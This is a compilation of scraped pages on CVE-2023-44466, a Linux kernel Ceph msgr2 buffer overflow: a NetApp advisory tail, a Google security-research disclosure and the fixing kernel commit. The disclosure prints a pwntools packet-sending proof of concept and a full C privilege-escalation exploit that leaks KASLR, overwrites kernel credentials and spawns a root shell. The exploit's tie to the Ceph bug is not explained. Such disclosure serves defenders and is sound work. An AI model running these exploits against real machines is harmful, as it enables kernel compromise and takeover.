* SRA Plugin for Linux
* SRA Plugin for Windows
* Single Mailbox Recovery
* Snap Creator Framework
* SnapCenter
* SnapCenter Plug-in for VMware vSphere/BlueXP backup and Recovery for Virtual Machine
* SnapGathers
* SnapManager for Hyper-V
* SolidFire Storage Replication Adapter
* StorageGRID (formerly StorageGRID Webscale)
* StorageGRID BIOS SG1000/SG100/SG1100/SG110
* StorageGRID BIOS SG5660/SG5612/SG5760/SG5712
* StorageGRID BIOS SG6060/SGF6024/SGF6112/SG6160
* StorageGRID Baseboard Management Controller (BMC) - SG6060/SG6160/SGF6024/SGF6112/SG100/SG110/SG1000/SG1100
* System Manager 9.x

Remediation
#### Software Versions and Fixes

NetApp's currently available patches are listed below.

| **Product** | **First Fixed in Release** |
| --- | --- |
| **NetApp HCI Baseboard Management Controller (BMC) - H300S/H500S/H700S/H410S** | NetApp HCI Baseboard Management Controller (BMC) - H300S/H500S/H700S/H410S has no plans to address this vulnerability. See the [EOA announcement](https://mysupport.netapp.com/info/communications/ECMLP2876227.html) for more information. |

#### Workarounds

None at this time.

#### Obtaining Software Fixes

Software fixes will be made available through the NetApp Support website in the Software Download section.

<https://mysupport.netapp.com/site/downloads/>

Customers who do not have access to the Support website should contact Technical Support at the number below to obtain the patches.

#### Contact Information

Check <http://mysupport.netapp.com> for further
updates.

**Technical Support**

Revision History
#### Status of This Notice

**Interim.**

NetApp will continue to update this advisory as additional information becomes available.

This advisory should be considered the single source of current, up-to-date, authorized and accurate information from NetApp regarding Full Support products and versions.

This advisory is posted at the following link:

<https://security.netapp.com/advisory/NTAP-20231116-0003>
#### Revision History

| **Revision #** | **Date** | **Comments** |
| --- | --- | --- |
| 1.0 | 20231116 | Initial Public Release |
| 2.0 | 20231130 | NetApp HCI Baseboard Management Controller (BMC) - H615C, NetApp HCI Baseboard Management Controller (BMC) - H610C, and NetApp HCI Baseboard Management Controller (BMC) - H610S moved to Products Not Affected, NetApp SolidFire & HCI Management Node and NetApp SolidFire & HCI Storage Node (Element Software) moved to Affected Products |
| 3.0 | 20231208 | SnapCenter Plug-in for VMware vSphere/BlueXP backup and Recovery for Virtual Machine moved to Products Not Affected |
| 4.0 | 20231214 | Brocade Fabric Operating System Firmware moved to Products Not Affected |
| 5.0 | 20240415 | NetApp HCI Baseboard Management Controller (BMC) - H300S/H500S/H700S/H410S moved to Won't Fix status |
| 6.0 | 20241014 | ONTAP Select Deploy administration utility moved to Affected Products |
| 7.0 | 20241022 | AFF Baseboard Management Controller (BMC) - A700s moved to Products Not Affected |

This document is provided solely for informational purposes. All information is based upon NetAppâs current knowledge and understanding of the hardware and software products tested by NetApp, and the methodology and assumptions used by NetApp. NetApp is not responsible for any errors or omissions that may be contained herein, and no warranty, representation, or other legal commitment or obligation is being provided by NetApp. Â© 2025 NetApp, Inc. All rights reserved. No portions of this document may be reproduced without prior written consent of NetApp, Inc.

 ©  NetApp

Have feedback for our website?
[Let us know](https://www.netapp.com/forms/site-feedback/)



=== Content from github.com_f70c3ed5_20250114_185124.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fgoogle%2Fsecurity-research%2Fsecurity%2Fadvisories%2FGHSA-jg27-jx6w-xwph)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fgoogle%2Fsecurity-research%2Fsecurity%2Fadvisories%2FGHSA-jg27-jx6w-xwph)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=google%2Fsecurity-research)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[google](/google)
/
**[security-research](/google/security-research)**
Public

* [Notifications](/login?return_to=%2Fgoogle%2Fsecurity-research) You must be signed in to change notification settings
* [Fork
  424](/login?return_to=%2Fgoogle%2Fsecurity-research)
* [Star
   3.5k](/login?return_to=%2Fgoogle%2Fsecurity-research)

* [Code](/google/security-research)
* [Issues
  8](/google/security-research/issues)
* [Pull requests
  15](/google/security-research/pulls)
* [Actions](/google/security-research/actions)
* [Security](/google/security-research/security)
* [Insights](/google/security-research/pulse)

Additional navigation options

* [Code](/google/security-research)
* [Issues](/google/security-research/issues)
* [Pull requests](/google/security-research/pulls)
* [Actions](/google/security-research/actions)
* [Security](/google/security-research/security)
* [Insights](/google/security-research/pulse)

# Linux Kernel: Ceph file system driver buffer overflow

Moderate

[rcorrea35](/rcorrea35)
published
GHSA-jg27-jx6w-xwph
Aug 30, 2023

## Package

Kernel
(Linux)

## Affected versions

5.11

## Patched versions

https://www.spinics.net/lists/ceph-devel/msg57909.html

## Description

### Summary

The Ceph filesystem has a Linux kernel module that receives TCP packets from an IP address.

Before any authorization is completed, any device with that IP address can send a packet that results in a buffer overflow in the kernel - a user controlled length is read from a TCP packet(ceph\_decode\_32(&p) in the link): <https://elixir.bootlin.com/linux/v6.4-rc1/source/net/ceph/messenger_v2.c#L520>.

This u32 is cast into an integer(fd\_lens has type int) which can result in a negative value making the checks on fd\_lens validity pass.

Then this integer is used to calculate the size of a buffer here <https://elixir.bootlin.com/linux/v6.4-rc1/source/net/ceph/messenger_v2.c#L1698>. The attacker can make the head\_len any value - for an overflow to happen the attacker could give a value less than the number of bytes to be copied in here: <https://elixir.bootlin.com/linux/v6.4-rc1/source/net/ceph/messenger_v2.c#L1711>. Here con->v2.in\_buf is also user controlled.

### Severity

Moderate - An attacker being able to identify the IP of a device reading the ceph file system can result in a denial of service and remote code execution in the kernel.

### Proof of Concept

Create a linux kernel qemu VM following these steps: <https://github.com/google/syzkaller/blob/master/docs/linux/setup_ubuntu-host_qemu-vm_x86-64-kernel.md#image>

Create 2 other disk images, compile the linux kernel, and then run qemu:

The bigdisk.img should be about 50GB and the other two at least 10GB

```
#!/bin/sh
qemu-system-x86_64 \
        -m 10G \
        -smp 2 \
        -kernel linux-6.0.1/arch/x86/boot/bzImage \
        -nographic \
        -append "nokaslr console=ttyS0 root=/dev/sda earlyprintk=serial net.ifnames=0" \
        -drive file=image/bigdisk.img,format=raw \
        -drive file=image/otherdisk.img,format=raw \
        -drive file=image/otherdisk2.img,format=raw \
        -net user,host=10.0.2.10,hostfwd=tcp:127.0.0.1:10021-:22 \
        -net nic,model=e1000 \
        -pidfile vm.pid \
        -s \
        2>&1 | tee vm.log
```

Within the qemu VM install ceph using this link <https://docs.ceph.com/en/latest/install/index_manual/> or the shell script below:

```
#!/bin/sh
apt update -y && apt install -y vim ceph ceph-mds
echo '[global]' >> /etc/ceph/ceph.conf
echo 'fsid = 10229502-b892-4925-b21d-00de3c4973eb' >> /etc/ceph/ceph.conf
echo 'mon_initial_members = syzkaller' >> /etc/ceph/ceph.conf
echo 'mon_host = [v2:10.0.0.1:3300/0,v1:10.0.0.1:6789/0]' >> /etc/ceph/ceph.conf
ceph-authtool --create-keyring /tmp/ceph.mon.keyring --gen-key -n mon. --cap mon 'allow *'
ceph-authtool --create-keyring /etc/ceph/ceph.client.admin.keyring --gen-key -n client.admin --cap mon 'allow *' --cap osd 'allow *' --cap mds 'allow *' --cap mgr 'allow *'
ceph-authtool --create-keyring /var/lib/ceph/bootstrap-osd/ceph.keyring --gen-key -n client.bootstrap-osd --cap mon 'profile bootstrap-osd' --cap mgr 'allow r'
ceph-authtool /tmp/ceph.mon.keyring --import-keyring /etc/ceph/ceph.client.admin.keyring
ceph-authtool /tmp/ceph.mon.keyring --import-keyring /var/lib/ceph/bootstrap-osd/ceph.keyring
chown ceph:ceph /tmp/ceph.mon.keyring
monmaptool --create --add syzkaller 10.0.2.15  --fsid 10229502-b892-4925-b21d-00de3c4973eb /tmp/monmap
sudo -u ceph mkdir /var/lib/ceph/mon/ceph-syzkaller
sudo -u ceph ceph-mon --mkfs -i syzkaller --monmap /tmp/monmap --keyring /tmp/ceph.mon.keyring
systemctl start ceph-mon@syzkaller
mkdir -p /mnt/mycephfs
```

By executing this script locally to send the packet:

```
#!/usr/bin/python3
from [pwn](https://source.corp.google.com/search?q=file%3A%28%2F%7C%5E%29pwn%28%5C.%28clif%7Cswig%7Cpy%7Cpyx%7Cspt%29%24%7C%2F%28__init__%5C.%28clif%7Cswig%7Cpy%7Cpyx%7Cspt%29%29%3F%24%29) import *
from [crc32c](https://source.corp.google.com/search?q=file%3A%28%2F%7C%5E%29crc32c%28%5C.%28clif%7Cswig%7Cpy%7Cpyx%7Cspt%29%24%7C%2F%28__init__%5C.%28clif%7Cswig%7Cpy%7Cpyx%7Cspt%29%29%3F%24%29) import [crc32c](https://source.corp.google.com/search?q=file%3A%28%2F%7C%5E%29crc32c%2Fcrc32c%28%5C.%28clif%7Cswig%7Cpy%7Cpyx%7Cspt%29%24%7C%2F%28__init__%5C.%28clif%7Cswig%7Cpy%7Cpyx%7Cspt%29%29%3F%24%29)
l = listen(3300)
c = l.wait_for_connection()
# receive ceph banner
c.recv(8)
# receive sizeof(u64)+sizeof(u64)
print("length of features:", u16(c.recv(2)))
# receive features that are supported
print("features: ", u64(c.recv(8)), u64(c.recv(8)))
# send ceph banner
c.send(b'ceph v2\n')
# length of features
c.send(p16(16))
# https://elixir.bootlin.com/linux/v6.4-rc1/source/net/ceph/messenger_v2.c#L1961
# features and required features
c.send(p64(1))
c.send(p64(1))
# https://elixir.bootlin.com/linux/v6.4-rc1/source/net/ceph/messenger_v2.c#L512
# fd_tag and fg_seg_cnt
preamble = p8(0) + p8(1)
# fd_lens and fd_aligns
# 2147483647+2147483647 casts to -2 and we want 37
# so head_len(size of buffer we can memcpy into)
# becomes 1 since head_onwire_len subtracts 36 bytes
preamble += p32(2147483647+2147483647-33) + p16(200)
# padding 20 bytes so it is 28 bytes
preamble += b'\x00'*20
assert(len(preamble)==28)
print("crc32c for preamble", crc32c(preamble))
c.send(preamble)
info("sending one kernel will compute: 2696580873")
# hash the kernel uses
c.send(p32(2696580873))
c.send(b'A'*3000000)
print('sent')
c.interactive()
```

and then running this command within the VM with the address of the device running hte python script

`mount -t ceph <ip address>:/ /mnt/mycephfs/ -o ms_mode=crc,name=foo`

will result in a KASAN dump.

```
#define _GNU_SOURCE /* Bring REG_XXX names from /usr/include/sys/ucontext.h */
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/prctl.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include "leak.h"
#define DRV_PATH "/dev/vuln"
#define PWN_GET 28673
#define SE_PATH "/sys/fs/selinux/policy"
#define TASK_NAME "th3lsh3ll"
#define TASK_OFFSET 1112
#define NAME_OFFSET 1848
#define CRED_OFFSET 1824
#define CRED_SIZE 176
#define MMAP_ADDR 0xdead1000
struct in {
	int fd_len;
	int pad;
	unsigned long actual[2];
	unsigned long size;
	unsigned long addr;
	unsigned long in_buf[8];
};
void* page;
struct in_write {
	int fd_len;
	int pad;
	unsigned long actual[2];
	unsigned long next_alloc[2];
	unsigned long in_buf[8];
};

int drv_fd = 0;
int se_fd = 0;

void bad_fd() {
	fprintf(stderr, "%s invalid driver fd %d\n", strerror(errno), drv_fd);
}

struct in* good = NULL;
struct in* kleak = NULL;
struct in_write* kw = NULL;

unsigned long kaslr_offset = 0;
unsigned long kmalloc8 = 0;

void free_all() {
	if(drv_fd) {
		read(drv_fd, 0, 0);
	} else {
		bad_fd();
	}
}

void alloc() {
	if(drv_fd) {
		if(ioctl(drv_fd, 0, good)<0) {
			fprintf(stderr, "ioctl failed spraying kmalloc16\n");
		}
	} else {
		bad_fd();
	}
}

void alloc_overflow(void* evil, int overflow) {
	if(drv_fd) {
		int cmd = overflow ? PWN_GET : 0;
		if(ioctl(drv_fd, cmd, evil) < 0) {
			fprintf(stderr, "leaking KASLR ioctl failed\n");
		}
	} else {
		bad_fd();
	}
}

// before triggering #DB exception make a SIGTRAP handler
extern char mayfault_insn_pre[];
extern char mayfault_insn_post[];
void sigtrap_handler(int signum, siginfo_t *info, void *uctx_) {
	ucontext_t *uctx = uctx_;
	if(uctx->uc_mcontext.gregs[REG_RIP] != (unsigned long)mayfault_insn_post) {
		printf("fault at unknown RIP 0x%lx, expected 0x%lx\n", (unsigned long)uctx->uc_mcontext.gregs[REG_RIP], (unsigned long)mayfault_insn_pre);
	if(signal(SIGTRAP, SIG_DFL) == SIG_ERR) {
		fprintf(stderr, "signal failed %s\n", strerror(errno));
	}
   }
}

void trigger_DB() {
	asm volatile(
"mayfault_insn_pre:\n\t"
  "int1\n"
"mayfault_insn_post:\n\t"
);
}
// tell the scheduler to pin a task to a specific CPU core
static void pin_task_to(int pid, int cpu) {
  cpu_set_t cset;
  CPU_ZERO(&cset);
  CPU_SET(cpu, &cset);
  if(sched_setaffinity(pid, sizeof(cpu_set_t), &cset)) {
	fprintf(stderr, "sched_setaffinity %s\n", strerror(errno));
   }
}
static void pin_to(int cpu) { pin_task_to(0, cpu); }

void alloc_plm() { if(!se_fd) { se_fd = open(SE_PATH, O_RDONLY); } }
void free_plm() { close(se_fd); se_fd = 0; }
int plm_hole = 32;

#define NUM_PRCTLS PAGE_SIZE
void * address[NUM_PRCTLS];

int rename_vma(void* addr, unsigned long size, char *name) {
    int res;
    res = prctl(PR_SET_VMA, PR_SET_VMA_ANON_NAME, (unsigned long)addr, size, name);
    if (res < 0) {
        fprintf(stderr, "[!] prctl %s 0x%lx %ld\n", strerror(errno), addr, size);
   	exit(1);
    }
    return res;
}

void alloc_vmans(size_t idx) {
               address[idx] =
		mmap(NULL, 1024, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        	char buf[12];
		memset(buf, 'a', 12);
        	char store[8];
        	memset(store, 'a', 8);
        	snprintf(store, 8, "%d", idx+1);
        	memcpy(&buf[4], store, 8);
        	rename_vma(address[idx], 1024, buf);
    }

void free_vmans(size_t idx) {
    rename_vma(address[idx], 1024, NULL);
    munmap(address[idx], 1024);
}

unsigned long* arb_read(unsigned long addr, unsigned long bytes) {
	unsigned long* leak = (unsigned long*)calloc((size_t)bytes, sizeof(unsigned long));
	kleak->addr = addr;
	kleak->size = bytes;
	lseek(se_fd, SEEK_SET, 0);
	free_all();
	alloc_overflow(kleak, 1);
	int nbytes = read(se_fd, leak, kleak->size);
	if(nbytes < 0) {
		fprintf(stderr, "arb_read: error reading %s\n", strerror(errno));
		return 0;
	}
	return leak;
}

void setup_kaslr_leak() {
	// pin to cpu and set SIGTRAP handler so we can trigger DB exception
	pin_to(0);
	struct sigaction sigtrap_action = {
		.sa_sigaction = sigtrap_handler,
		.sa_flags = SA_SIGINFO
	};
	int ret = sigaction(SIGTRAP, &sigtrap_action, NULL);
	if(ret < 0) {
		fprintf(stderr, "sigaction failed %d %s\n", ret, strerror(errno));
	}
	// read kernel pointers
	trigger_DB();
}

unsigned long kaslr_leak() {
	char* ans = (char*)arb_read(0xfffffe000000f000, PAGE_SIZE*2);
	// calculate KASLR offset
	char* first_leak = ans+0x1f48;
	unsigned long kptr =(*(unsigned long*)first_leak);
	if(!*first_leak || kptr < 0xffffffff81e0124d) {
		fprintf(stderr, "[!] either leak failed or KASLR disabled\n");
	}
	kaslr_offset = kptr - 0xffffffff81e0124d;
	return kaslr_offset;
}

void warm_heap() {
	puts("[*] warming heap");
	for(size_t i=0; i<256; i++) {
		alloc_vmans(i);
	}
	for(size_t i=0; i<256; i++) {
		free_vmans(i);
	}
}

int main(char argc, char** argv) {
	setup_kaslr_leak();
	// set process name so we can find it in task_struct linked list
	if(prctl(PR_SET_NAME, TASK_NAME, 0, 0, 0)) {
		fprintf(stderr, "prctl failed to set process name: %s\n", strerror(errno));
		return 1;
	}
	good = (struct in*)calloc(1, sizeof(struct in));
	good->fd_len = 16;
	// open driver
	drv_fd = open(DRV_PATH, O_RDWR);
	if(drv_fd < 0) {
		 fprintf(stderr, "%s driver device not available\n", strerror(errno));
		 return 1;
	}
		// leaking cred struct for current process task_struct by traversing task list starting
	// from init_task
	kleak = (struct in*)calloc(1, sizeof(struct in));
	char* leak = (char*)calloc(PAGE_SIZE, sizeof(char));
	kleak->fd_len = -20;
	unsigned long credptr = 0x42424242;
	char pname[9];
	pname[8] = 0;
	warm_heap();
	// make the SELinuxfs plm struct adjacent in memory to victim chunk
	// so we can overflow the size and address to copy to userspace
	alloc_vmans(1);
	alloc_vmans(0);
	free_vmans(0);
	alloc_overflow(good, 0);
	free_vmans(1);
	alloc_plm();
	kaslr_offset = kaslr_leak();
	printf("[*] KASLR offset 0x%lx\n", kaslr_offset);
	unsigned long init_task = 0xffffffff828149c0+kaslr_offset;
	unsigned long current = init_task;
	while(1) {
		current = (*(arb_read(current+TASK_OFFSET, 8))) - TASK_OFFSET;
		*(unsigned long*)pname = (*(arb_read(current + NAME_OFFSET, 8)));
		//printf("process name %s\n", pname);
		if(strchr(pname, '|')) {
			// regular SELinux reads as pipe if overflow fails to happen
			break;
		}
		if(!strncmp(TASK_NAME, pname, 8)) {
				printf("[*] 0x%lx current\n", current);
				unsigned long* addr = arb_read(current+CRED_OFFSET, 8);
				credptr = *addr;
				addr = arb_read(*addr, CRED_SIZE);
				printf("[*] current->real_cred: 0x%lx\n", credptr);
				hex_dump((char*)addr, CRED_SIZE);
				break;
		}
		if(init_task == current) {
			puts("failed");
			break;
		}
	}
	alloc_vmans(0);
	alloc_vmans(1);
	free_vmans(0);
	free_vmans(1);

	kw = (struct in_write*)calloc(1, sizeof(struct in_write));
	kw->fd_len = -20;
	// start at fsid since it has 0x0s after it
	// once it gets overwritten with 0 do the next field with the same
	// freelist overwrite
	// key thing to remember is offset is size of heap chunk divided by 2
	// and last_chunk + offset
	kw->next_alloc[1] = credptr+32;

	alloc_overflow(kw, 1);
	for(size_t j=0; j<3; j++) {
		// allocate a chunk at the overwritten address
		// then write all zeroes to it
		alloc_overflow(good, 0);
	}
	// repeat for all the fields in the top of
	// the struct cred
	for(size_t i=0; i<5; i++) {
		warm_heap();
		alloc_vmans(0);
		alloc_vmans(1);
		free_vmans(0);
		free_vmans(1);
		kw->next_alloc[1] -= 8;
		alloc_overflow(kw, 1);
		for(size_t j=0; j<3; j++) {
			alloc_overflow(good, 0);
		}
	}
	if((getuid() == 0) && (geteuid() == 0)) {
		system("/bin/sh");
	} else {
		puts("[!] nooo failed\n");
	}
	if (fork()) {
       		return 0;
   	} else {
       	//hold the fd for SELinuxFS file so the overwritten pointer is not freed
	//since this causes a kernel panic
       	while(1) { sleep(1000); }
   	}
	return 0;
}
```

[CVE-2023-44466](https://github.com/advisories/GHSA-7wwm-57j8-wx2j "CVE-2023-44466")

### Timeline

**Date reported**: 07/05/2023

**Date fixed**: 07/12/2023

**Date disclosed**: 8/30/2023

### Severity

Moderate

### CVE ID

CVE-2023-44466

### Weaknesses

[CWE-122](/advisories?query=cwe%3A122) [CWE-680](/advisories?query=cwe%3A680)

### Credits

* [![@docfate111](https://avatars.githubusercontent.com/u/24590069?s=40&v=4)](/docfate111)
  [docfate111](/docfate111)
  Finder

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_e96686c4_20250114_185126.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ftorvalds%2Flinux%2Fcommit%2Fa282a2f10539dce2aa619e71e1817570d557fc97)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ftorvalds%2Flinux%2Fcommit%2Fa282a2f10539dce2aa619e71e1817570d557fc97)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=torvalds%2Flinux)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[torvalds](/torvalds)
/
**[linux](/torvalds/linux)**
Public

* [Notifications](/login?return_to=%2Ftorvalds%2Flinux) You must be signed in to change notification settings
* [Fork
  54.7k](/login?return_to=%2Ftorvalds%2Flinux)
* [Star
   186k](/login?return_to=%2Ftorvalds%2Flinux)

* [Code](/torvalds/linux)
* [Pull requests
  434](/torvalds/linux/pulls)
* [Actions](/torvalds/linux/actions)
* [Projects
  0](/torvalds/linux/projects)
* [Security](/torvalds/linux/security)
* [Insights](/torvalds/linux/pulse)

Additional navigation options

* [Code](/torvalds/linux)
* [Pull requests](/torvalds/linux/pulls)
* [Actions](/torvalds/linux/actions)
* [Projects](/torvalds/linux/projects)
* [Security](/torvalds/linux/security)
* [Insights](/torvalds/linux/pulse)

## Commit

[Permalink](/torvalds/linux/commit/a282a2f10539dce2aa619e71e1817570d557fc97)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

libceph: harden msgr2.1 frame segment length checks

[Browse files](/torvalds/linux/tree/a282a2f10539dce2aa619e71e1817570d557fc97)
Browse the repository at this point in the history

```
ceph_frame_desc::fd_lens is an int array.  decode_preamble() thus
effectively casts u32 -> int but the checks for segment lengths are
written as if on unsigned values.  While reading in HELLO or one of the
AUTH frames (before authentication is completed), arithmetic in
head_onwire_len() can get duped by negative ctrl_len and produce
head_len which is less than CEPH_PREAMBLE_LEN but still positive.
This would lead to a buffer overrun in prepare_read_control() as the
preamble gets copied to the newly allocated buffer of size head_len.

Cc: stable@vger.kernel.org
Fixes: [cd1a677](https://github.com/torvalds/linux/commit/cd1a677cad994021b19665ed476aea63f5d54f31) ("libceph, ceph: implement msgr2.1 protocol (crc and secure modes)")
Reported-by: Thelford Williams <thelford@google.com>
Signed-off-by: Ilya Dryomov <idryomov@gmail.com>
Reviewed-by: Xiubo Li <xiubli@redhat.com>
```

* Loading branch information

[![@idryomov](https://avatars.githubusercontent.com/u/567341?s=40&v=4)](/idryomov)

[idryomov](/torvalds/linux/commits?author=idryomov "View all commits by idryomov")
committed
Jul 13, 2023

1 parent
[06c2afb](/torvalds/linux/commit/06c2afb862f9da8dc5efa4b6076a0e48c3fbaaa5)

commit a282a2f

Showing
**1 changed file**
with
**26 additions**
and
**15 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

## There are no files selected for viewing

41 changes: 26 additions & 15 deletions

41
[net/ceph/messenger\_v2.c](#diff-4baa021467c92d943d7837f3be372f4fc9aeb2ee478726e069b6b10c7d2c5d32 "net/ceph/messenger_v2.c")

Show comments

[View file](/torvalds/linux/blob/a282a2f10539dce2aa619e71e1817570d557fc97/net/ceph/messenger_v2.c)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -390,6 +390,8 @@ static int head\_onwire\_len(int ctrl\_len, bool secure) |
|  |  | int head\_len; |
|  |  | int rem\_len; |
|  |  |  |
|  |  | BUG\_ON(ctrl\_len < 0 || ctrl\_len > CEPH\_MSG\_MAX\_CONTROL\_LEN); |
|  |  |  |
|  |  | if (secure) { |
|  |  | head\_len = CEPH\_PREAMBLE\_SECURE\_LEN; |
|  |  | if (ctrl\_len > CEPH\_PREAMBLE\_INLINE\_LEN) { |
| Expand All | | @@ -408,6 +410,10 @@ static int head\_onwire\_len(int ctrl\_len, bool secure) |
|  |  | static int \_\_tail\_onwire\_len(int front\_len, int middle\_len, int data\_len, |
|  |  | bool secure) |
|  |  | { |
|  |  | BUG\_ON(front\_len < 0 || front\_len > CEPH\_MSG\_MAX\_FRONT\_LEN || |
